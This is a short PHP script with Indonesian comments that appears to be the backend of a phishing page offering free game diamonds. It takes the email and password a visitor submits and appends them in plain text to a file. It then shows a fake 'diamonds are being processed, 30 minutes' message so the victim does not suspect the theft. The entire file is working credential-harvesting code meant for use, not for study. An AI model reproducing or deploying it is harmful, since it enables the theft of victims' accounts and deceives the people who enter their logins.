<?php
$email = $_POST['email'];
$password = $_POST['password'];

// Format isi file
$isi = "Email: $email\nPassword: $password\n\n";

// Simpan ke file.txt di folder nipu

$file = fopen("data_user.txt", "a"); // mode 'a' untuk append
fwrite($file, $isi);
fclose($file);

echo  "Diamond Sedang Diproses, Perkiraan Waktu 30 Menit";
?>